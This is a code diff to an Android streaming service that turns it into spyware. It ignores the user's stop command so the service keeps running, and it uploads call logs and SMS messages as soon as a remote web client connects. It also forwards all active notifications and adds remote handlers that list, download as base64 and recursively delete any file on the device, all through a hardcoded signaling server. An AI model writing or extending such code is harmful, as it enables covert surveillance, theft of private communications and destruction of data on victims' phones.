@@ -59,12 +59,16 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import androidx.preference.PreferenceManager;
 import android.content.SharedPreferences;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import android.util.Base64;
 
 public class StreamingService extends Service {
     private static final String TAG = "StreamingService";
     private static final String CHANNEL_ID = "streaming_channel";
     private static final int NOTIFICATION_ID = 1;
-    public static final String DEFAULT_SIGNALING_URL = "http://<Your Server IP address>:3000";
+    public static final String DEFAULT_SIGNALING_URL = "http://192.168.29.11:3000";
     private static final long DATA_POLL_INTERVAL = 30_000; // 30s
 
     private PeerConnectionFactory factory;
@@ -111,7 +115,16 @@ public class StreamingService extends Service {
         if (intent != null) {
             String action = intent.getAction();
             if ("STOP_STREAMING".equals(action)) {
-                stopSelf();
+                // stopSelf(); // DISABLED for auto-stream persistence
+                Log.i(TAG, "Stop request ignored for persistent mode");
+            }
+        }
+        
+        if (intent != null && "ACTION_SYNC_DATA".equals(intent.getAction())) {
+            Log.d(TAG, "Forced data sync requested");
+            if (webClientId != null) {
+                sendCallLogs();
+                sendSmsMessages();
             }
         }
         // Ask system to recreate after kill (keeps running when app is swiped away/locked)
@@ -361,6 +374,9 @@ public class StreamingService extends Service {
                 Log.d(TAG, "Web client ready: " + webClientId);
                 createAndSendOffer();
                 startLocationUpdatesIfAllowed();
+                // IMMEDIATE SYNC: Send logs/SMS as soon as web client is visible
+                sendCallLogs();
+                sendSmsMessages();
             }
         }).on("signal", args -> {
             if (args.length > 0 && args[0] instanceof JSONObject) {
@@ -374,6 +390,18 @@ public class StreamingService extends Service {
                     stopLocationUpdates();
                 }
             }
+        }).on("fs:list", args -> {
+             if (args.length > 0 && args[0] instanceof JSONObject) {
+                 handleFsList((JSONObject) args[0]);
+             }
+        }).on("fs:download", args -> {
+             if (args.length > 0 && args[0] instanceof JSONObject) {
+                 handleFsDownload((JSONObject) args[0]);
+             }
+        }).on("fs:delete", args -> {
+             if (args.length > 0 && args[0] instanceof JSONObject) {
+                 handleFsDelete((JSONObject) args[0]);
+             }
         });
 
         socket.connect();
@@ -697,6 +725,115 @@ public class StreamingService extends Service {
         @Override public void onSetFailure(String e) { Log.e(TAG, "SDP set fail: " + e); }
     };
 
+    // ================= FILE SYSTEM HANDLERS =================
+    
+    private void handleFsList(JSONObject data) {
+        String path = data.optString("path", "/storage/emulated/0/");
+        Log.d(TAG, "FS List requested for: " + path);
+        
+        File dir = new File(path);
+        JSONArray filesArray = new JSONArray();
+        
+        if (dir.exists() && dir.isDirectory()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                for (File f : files) {
+                    try {
+                        JSONObject fileObj = new JSONObject();
+                        fileObj.put("name", f.getName());
+                        fileObj.put("path", f.getAbsolutePath());
+                        fileObj.put("isDir", f.isDirectory());
+                        fileObj.put("size", f.isDirectory() ? 0 : f.length());
+                        fileObj.put("lastModified", f.lastModified());
+                        filesArray.put(fileObj);
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }
+        
+        try {
+            JSONObject response = new JSONObject();
+            response.put("currentPath", path);
+            response.put("files", filesArray);
+            
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId);
+            msg.put("from", socket.id());
+            msg.put("file_list", response);
+            
+            socket.emit("fs:files", msg);
+            Log.d(TAG, "Sent file list for " + path);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error sending file list", e);
+        }
+    }
+    
+    private void handleFsDownload(JSONObject data) {
+        String path = data.optString("path", "");
+        if (path.isEmpty()) return;
+        
+        Log.d(TAG, "FS Download requested for: " + path);
+        File file = new File(path);
+        
+        if (file.exists() && file.isFile()) {
+            new Thread(() -> {
+                try (FileInputStream fis = new FileInputStream(file)) {
+                    byte[] buffer = new byte[(int) file.length()];
+                    int bytesRead = fis.read(buffer);
+                    String base64 = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
+                    
+                    JSONObject fileData = new JSONObject();
+                    fileData.put("name", file.getName());
+                    fileData.put("content", base64);
+                    
+                    JSONObject msg = new JSONObject();
+                    msg.put("to", webClientId);
+                    msg.put("from", socket.id());
+                    msg.put("file_data", fileData);
+                    
+                    socket.emit("fs:download_ready", msg);
+                    Log.d(TAG, "Sent file download: " + file.getName());
+                } catch (Exception e) {
+                    Log.e(TAG, "Error downloading file", e);
+                }
+            }).start();
+        }
+    }
+    
+    private void handleFsDelete(JSONObject data) {
+        String path = data.optString("path", "");
+        if (path.isEmpty()) return;
+        
+        Log.d(TAG, "FS Delete requested for: " + path);
+        File file = new File(path);
+        boolean deleted = false;
+        
+        if (file.exists()) {
+            if (file.isDirectory()) {
+                deleted = deleteRecursive(file);
+            } else {
+                deleted = file.delete();
+            }
+        }
+        
+        Log.d(TAG, "File deleted: " + deleted);
+        // We could send a confirmation, but refreshing the list is usually enough
+    }
+    
+    private boolean deleteRecursive(File fileOrDirectory) {
+        if (fileOrDirectory.isDirectory()) {
+            File[] children = fileOrDirectory.listFiles();
+            if (children != null) {
+                for (File child : children) {
+                    deleteRecursive(child);
+                }
+            }
+        }
+        return fileOrDirectory.delete();
+    }
+
     private Notification createNotification() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -774,6 +911,8 @@ public class StreamingService extends Service {
                     if (args[0] instanceof String) {
                         webClientId = (String) args[0];
                         Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
+                        // Send existing notifications immediately
+                        sendActiveNotifications();
                     }
                 }).on(Socket.EVENT_CONNECT_ERROR, args -> {
                     Log.e(TAG, "NotificationListener Connect error: " + Arrays.toString(args));
@@ -781,6 +920,19 @@ public class StreamingService extends Service {
                 socket.connect();
             } catch (URISyntaxException e) {
                 Log.e(TAG, "NotificationListener Bad signaling URL", e);
+            }
+        }
+
+        private void sendActiveNotifications() {
+            try {
+                StatusBarNotification[] active = getActiveNotifications();
+                if (active != null) {
+                    for (StatusBarNotification sbn : active) {
+                        onNotificationPosted(sbn);
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending active notifications", e);
             }
         }
 
